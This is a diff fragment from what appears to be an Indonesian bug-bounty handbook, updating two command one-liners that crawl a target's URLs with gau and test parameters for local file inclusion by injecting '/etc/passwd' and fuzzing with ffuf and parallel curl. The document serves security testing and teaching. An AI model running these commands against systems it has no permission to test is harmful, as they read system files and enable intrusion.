@@ -276,13 +276,13 @@ bisa juga cek [disini](https://1amkaiz3ns-books.gitbook.io/bug-bounty/handbook/v
 **LFI testing with FFUF and passwd file detection**
 
 ```bash
-echo "https://target.com/" | gau | gf lfi | uro | sed 's/=.*/=/' | qsreplace "FUZZ" | sort -u | xargs -I{} ffuf -u {} -w payloads/lfi.txt -c -mr "root:(x|\*|\$[^\:]*):0:0:" -v
+echo "https://target.com/" | gau --providers wayback,commoncrawl,otx,urlscan | gf lfi | uro | sed 's/=.*/=/' | qsreplace "FUZZ" | sort -u | xargs -I{} ffuf -u {} -w payloads/lfi.txt -c -mr "root:(x|\*|\$[^\:]*):0:0:" -v
 ```
 
 **LFI testing with curl and parallel processing**
 
 ```bash
-gau target.com | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
+gau --providers wayback,commoncrawl,otx,urlscan target.com | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
 ```
 
 **LFI testing with httpx**
